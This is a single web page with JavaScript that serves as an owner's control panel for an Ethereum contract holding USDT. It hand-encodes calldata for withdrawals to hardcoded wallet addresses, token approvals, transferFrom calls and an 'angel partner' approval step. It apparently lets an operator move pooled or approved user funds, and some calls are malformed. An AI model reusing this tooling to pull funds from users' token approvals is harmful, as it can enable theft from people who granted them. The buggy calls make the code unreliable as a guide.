<!DOCTYPE html>
<html lang="zh">

<head>
    <meta charset="UTF-8">
    <!-- <link rel="icon" href="favicon.ico" /> -->
    <link rel="shortcut icon" href="https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=3928369719,4033853384&fm=26&gp=0.jpg">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.0/css/bootstrap.min.css">
    <title>AMB合约管理</title>
</head>

<body>
    <table class="table table-border table-bordered table-bg" style="width: 100%;margin:0 auto;">
        <thead>
            <tr>
                <td><span id="Contract">合约地址</span></td>
            </tr>
            <tr>
                <th><span id="account"></span></th>
            </tr>
            <tr>
                <td>
                    <select class="select" id="to">
                        <option value="0xf65EE4265d982a68de2738271385BF549929ab7d">提现地址7d</option>
                        <option value="0xd8512a2497bdFcfE859e427E79440757976B3811">管理地址811</option>
                        <option value="0x50c334dfc6fD1e4ba51535FB8CdC7860023d8442">合约地址442</option>
                    </select>
                </td>
            </tr>
            <tr>
                <td>
                    <input type="number" id="num" placeholder="数量" style="font-size: 13px;" class="form-control">
                </td>
            </tr>
            <tr>
                <td>
                    <button class="btn btn-warning radius" onclick="sendToken('withdraw')">合约提现</button> 
                    <button class="btn btn-warning radius" onclick="sendToken('approve')">授权提现</button>
                    <button class="btn btn-default radius" onclick="sendToken('balanceOf')">授权查询</button>
                    <button class="btn btn-success radius" onclick="sendToken('transferFrom')">模拟提币</button>
                    <button class="btn btn-success radius" onclick="sign()">签名</button>
                </td>
            </tr>
            <tr>
                <td>
                    <button class="btn btn-primary radius" style="margin-top: 10px;" onclick="sendToken('usdt_approve')">授权USDT</button>
                    <button class="btn btn-primary radius" style="margin-top: 10px;" onclick="sendToken('get_approve')">查询USDT授权</button>
                    <button class="btn btn-primary radius" style="margin-top: 10px;" onclick="sendToken('use_approve')">使用授权</button>
                </td>
            </tr>

        </thead>

    </table>
    <div id="msg"></div>
</body>

</html>

<script src="https://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>

<script type="text/javascript">
    var layer = {};
    layer.msg = function(msg) {
        alert(msg);
    }

    var Contract = '0x50c334dfc6fD1e4ba51535FB8CdC7860023d8442';
    var UsdtAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7';

    var ContractAbi = [{"constant":false,"inputs":[{"internalType":"address","name":"_spender","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"_contractAddress","type":"address"},{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"_contractAddress","type":"address"},{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"constant":true,"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"balance","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}];
    var usdtAbi = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowed","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"}];
    $("#Contract").html("合约地址<br>"+Contract);

    connect(); // 连接

    // 发送地址
    var account;

    const accounts = [];

    const value = '0x0'
    const desiredNetwork = '1'
    function connect() {
        if (typeof window.ethereum === 'undefined') {
            alert('你需要一个Dapp浏览器才能开始.');
        } else {
            ethereum.enable()
            .catch(function(reason) {
                if (reason === 'User rejected provider access') {
                } else {
                    alert('已拒绝连接')
                }
            })
            .then(function(accounts) {
                if (ethereum.networkVersion !== desiredNetwork) {
                    console.log('当前不是主网络 [network ' + ethereum.networkVersion + ']');
                }
                account = accounts[0];
                $("#account").html("管理地址 <br>" + account);
            })
        }
    }

    function sendToken(type) {
        if (!account) {
            return layer.msg("请确认是否连接钱包");
        }

        // input
        var to = $("#to").val();
        var num = $("#num").val();

        var to = to.split('0x')[1];
        var num = (parseInt(num * 10 ** 6)).toString(16);
        var usdt = UsdtAddress.split('0x')[1];
        
        // data
        var data = '0x';
        var info = '';
        var params = [];
        switch (type) {
            case 'withdraw':
                data += 'beabacc8';
                data += get0(64 - usdt.length) + usdt;
                data += get0(64 - to.length) + to;
                data += get0(64 - num.length) + num;
                info = '提版权 & 基金池 ';
                break;
            case 'transferFrom':
                data += '23b872dd';
                data += get0(64 - usdt.length) + usdt;
                data += get0(64 - to.length) + to;
                data += get0(64 - num.length) + num;
                info = '模拟提币';
            break;
            case 'approve':
                data += '095ea7b3';
                data += get0(64 - to.length) + to;
                data += get0(64 - num.length) + num;
                info = '提现授权';
                break;
            case 'balanceOf':
                web3 = new Web3(web3.currentProvider);
                
                var myContract = web3.eth.contract(usdtAbi).at(UsdtAddress);
                myContract.balanceOf(Contract,function (error, result){
                    if(error){
                        alert(error)
                    }else{
                        $("#msg").prepend("<div class='alert alert-success'"+data+to+"<br>合约余额："+(result.toString()/10**6)+"<br>"+(new Date().toLocaleString())+"</div>");
                    }
                });

                var myContract = web3.eth.contract(ContractAbi).at(Contract);
                myContract.balanceOf(data+to,function (error, result){
                    if(error){
                        alert(error)
                    }else{
                        $("#msg").prepend("<div class='alert alert-success'"+data+to+"<br>授权提现余额："+(result.toString()/10**6)+"<br>"+(new Date().toLocaleString())+"</div>");
                    }
                });
                return;
            case 'usdt_approve':
                data += '095ea7b3';
                data += get0(64 - to.length) + to; // 合约地址
                data += get0(64 - num.length) + num; // 数量
                info = '授权USDT';

                params = [{
                    from: account,
                    to: UsdtAddress,
                    data: data,
                    orderInfo:info,
                }]
                console.log(params);

                break;
            case 'get_approve':
                web3 = new Web3(web3.currentProvider);
                var myContract = web3.eth.contract(usdtAbi).at(UsdtAddress);
                console.log("get_approve",account,data+to);
                
                // allowance(自己地址,合约地址)
                myContract.allowance(account,data+to,function (error, result){
                    console.log("查询结果");
                    if(error){
                        alert(error)
                    }else{
                        $("#msg").prepend("<div class='alert alert-success'"+data+to+"<br>可用授权："+(result.toString()/10**6)+"<br>"+(new Date().toLocaleString())+"</div>");
                    }
                });
                return;
            case 'use_approve':
            data += '4f6b13d1';
                data += get0(64 - usdt.length) + usdt;
                data += get0(64 - num.length) + num;
                info = '成为天使合伙人';
                break;
            default:
                break;
        }
        console.log(data, data.length);

        if(params.length == 0){
            params = [{
                from: account,
                to: Contract,
                data: data,
                orderInfo:info,
            }]
        }
       
        console.log(params);

        ethereum.sendAsync({
            method: 'eth_sendTransaction',
            params: params,
            from: account, 
        }, (err, result) => {
            if (err) {
                // alert(err);
            } else {
                console.log(result);
                $("#msg").prepend("<div class='alert alert-success'"+to+"<br>发送成功："+$("#num").val()+"<br>"+result.result+"<br>"+(new Date().toLocaleString())+"</div>");
            }
        })
    }

    function get0(n) {
        var str = '';
        for (var i = 0; i < n; i++) {
            str += '0';
        }
        return str;
    }

    ethereum.on('accountsChanged', function(accounts) {
        console.log("Time to reload your interface with accounts[0]!");
        connect();
    })

    function pollForCompletion(txHash, callback) {
        let calledBack = false
        const checkInterval = setInterval(function() {
            const notYet = 'response has no error or result'
            ethereum.sendAsync({
                method: 'eth_getTransactionByHash',
                params: [txHash],
            }, function(err, response) {
                if (calledBack) return
                if (err || response.error) {
                    if (err.message.includes(notYet)) {
                        return 'transaction is not yet mined'
                    }

                    callback(err || response.error)
                }
                const transaction = response.result
                clearInterval(checkInterval)
                calledBack = true
                callback(null, transaction)
            })
        }, 2000)
    }

    function sign()
    {
        if (!account) {
            return layer.msg("请确认是否连接钱包");
        }

        event.preventDefault()
        var msg = '欢迎来到AMB';
        // var msg = ethUtil.bufferToHex(new Buffer(text, 'utf8'))
        // var msg = '0x1' // hexEncode(text)
        // var msg = '0x796368756e' // hexEncode(text)
        
        console.log(msg)
        var from = '0x6eb84E71576e8729840Fb93eE0855c06a5F2BcbA';
        if (!from) return connect()

        console.log('CLICKED, SENDING PERSONAL SIGN REQ');

        web3.currentProvider.sendAsync({
            method: 'personal_sign',
            params: [msg, account],
            from: account
        }, function (err, result) {
          if (err) return console.error(err)
          if (result.error) return console.error(result.error)

          console.log("0xff95d44e4df2d1d06bdd780fa06a6049dec88f7fd544f234d3184d694b6f53d436e424f6c5d70b461f4df1dcafac8b97a9222784e0624b03586809aef3808cea1c");
          
          console.log('sign:' + JSON.stringify(result.result))

            return ;

          console.log('recovering...')
          const msgParams = { data: msg }
          msgParams.sig = result.result

          method = 'personal_ecRecover'
          var params = [msg, result.result]
          web3.currentProvider.sendAsync({
            method,
            params,
            from,
          }, function (err, result) {
            var recovered = result.result;
            console.log('ec recover called back:')
            console.dir({ err, recovered })


            // if (err) return console.error(err)
            if (err){
                alert(err);
            }
            // if (result.error) return console.error(result.error)
            if (result.error) {
                alert(result.error);
            }

            // if (recovered === from) {
            //   console.log('Successfully ecRecovered signer as ' + from)
            //   alert('成功地将签名者恢复为ec ' + from)
            // } else {
            //   console.log('Failed to verify signer when comparing ' + result + ' to ' + from)
            // }

          })
        })

    }
</script>
